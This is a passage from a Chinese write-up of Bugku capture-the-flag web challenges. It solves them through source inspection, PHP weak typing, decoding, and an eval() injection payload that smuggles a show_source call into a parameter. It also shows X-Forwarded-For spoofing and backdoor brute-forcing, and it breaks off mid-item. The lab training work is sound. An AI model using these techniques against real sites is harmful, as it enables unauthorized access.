class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>web2</span><br><span class="line">听说聪明的人都能找到答案</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/web2/</span></span><br><span class="line">CTRL + u 查看源代码</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>计算器</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/yanzhengma/</span></span><br><span class="line">改一下字符输入长度的限制</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>web基础$_GET</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/get/</span></span><br><span class="line">?<span class="keyword">var</span>=val</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>web基础$_POST</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/get/index1.php</span></span><br><span class="line">直接用BurpSuite改包，注意先改为POST request</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>矛盾</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/get/index1.php</span></span><br><span class="line">$num = $_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num)) &#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num == <span class="number">1</span>)  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">此处 == 为弱类型判断，num = <span class="number">1</span>e ，num == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>web3</span><br><span class="line">flag就在这里快来找找吧</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/web3/</span></span><br><span class="line">直接查看源码，得&amp;<span class="comment">#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;</span></span><br><span class="line">&amp;<span class="comment">#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</span></span><br><span class="line">扔到 Burp 解码试试，解为html得flag</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>域名解析</span><br><span class="line">听说把 flag.bugku.com 解析到<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span> 就能拿到flag</span><br><span class="line">两种办法：<span class="number">1.</span>直接改本机 host 文件</span><br><span class="line">  <span class="number">2.</span>访问时将请求头中的 host 改为flag.bugku.com</span><br><span class="line">然而我两种办法都失败了，显示域名没备案，哈哈哈</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>你必须让他停下</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/web12/</span></span><br><span class="line">页面不断的自动刷新，用Burp拦截，一张图一张图看，源代码中蕴含了 flag</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>本地包含</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// @ 可屏蔽报错信息的显示</span></span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);   <span class="comment">// eval() 漏洞</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">show_source() 对文件进行语法高亮</span><br><span class="line">hello=<span class="number">1</span>);show_source(<span class="string">'flag.php'</span>);var_dump(</span><br><span class="line">最终解释为：</span><br><span class="line">var_dump(<span class="number">1</span>);show_source(<span class="string">'flag.php'</span>);var_dump(show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>变量<span class="number">1</span></span><br><span class="line">flag In the variable ! </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">$args = $_GET[<span class="string">'args'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">通过 <span class="keyword">include</span> 或 <span class="keyword">require</span> 语句，可以将 PHP 文件的内容插入另一个 PHP 文件</span><br><span class="line"></span><br><span class="line"><span class="comment">// preg_match() 正则表达式匹配函数</span></span><br><span class="line"></span><br><span class="line">/^\w+$/</span><br><span class="line"></span><br><span class="line">两个<span class="comment">//表示开始和结束</span></span><br><span class="line">^表示开始字符串</span><br><span class="line">$表示结束字符串</span><br><span class="line">\w表示包含【a-z，A-Z, _ , <span class="number">0</span><span class="number">-9</span>】</span><br><span class="line">+表示一个或者多个\w</span><br><span class="line"></span><br><span class="line">var_dump()显示一个或多个表达式的结构信息，包括表达式的类型与值。</span><br><span class="line">数组将递归展开值，通过缩进显示其结构</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>()存在命令执行漏洞，我们是想查看flag1.php中的flag，</span><br><span class="line">首先想到的是本地包含漏洞，查看源码，或者上传一句话木马等思路</span><br><span class="line">但是条件判断加了正则表达式判断，过滤了括号和引号等字符。</span><br><span class="line">PHP 在 $GLOBALS[index] 数组中存储了所有全局变量，数组的键值为变量名</span><br><span class="line"></span><br><span class="line">$$args = $($args)</span><br><span class="line"></span><br><span class="line">$$ --&gt; 可变变量，允许动态改变一个变量名称</span><br><span class="line">$name = <span class="string">"trans"</span>;</span><br><span class="line">$trans = <span class="string">"You can see me"</span>;</span><br><span class="line"><span class="keyword">echo</span> $name.&lt;br&gt;;</span><br><span class="line"><span class="keyword">echo</span> $$name;</span><br><span class="line"></span><br><span class="line">------------</span><br><span class="line">结果:</span><br><span class="line">trans</span><br><span class="line">You can see me</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span>web5</span><br><span class="line">JSPFUCK??????答案格式CTF&#123;**&#125;</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/web5/</span></span><br><span class="line">查看源代码可得：([][(![]+[])[+[]] 这种加密过后的 js 代码，直接扔到 console 跑一下就出来</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span>头等舱</span><br><span class="line">老办法，先看源代码，源代码还是啥也没有，看看请求头，找到了</span><br><span class="line"></span><br><span class="line"><span class="number">13.</span>网站被黑</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/webshell/</span></span><br><span class="line">这个题没技术含量但是实战中经常遇到</span><br><span class="line">扫一下后台，找到后门，Burp 爆破就看到了</span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>管理员系统</span><br><span class="line">特别突出的是 非本地IP访问，直接改个 X-Forwarded-<span class="keyword">For</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>，然后再爆破</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。</span><br><span class="line">它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。</span><br><span class="line">标准格式如下：X-Forwarded-<span class="keyword">For</span>: client1, proxy1, proxy2</span><br><span class="line">HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，</span><br><span class="line">告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理</span><br><span class="line"></span><br><span class="line"><span class="number">15.</span>web4</span><br><span class="line"><span class="keyword">var</span> p1 = ----;</span><br><span class="line"><span class="keyword">var</span> p2 = ----;</span><br><span class="line"><span class="keyword">eval</span>(unescape(p1) + unescape(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br><span class="line"><span class="comment">// 54aa2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br><span class="line">明显发现有一段被 base64 加密过，解码可得</span><br><span class="line"></span><br><span 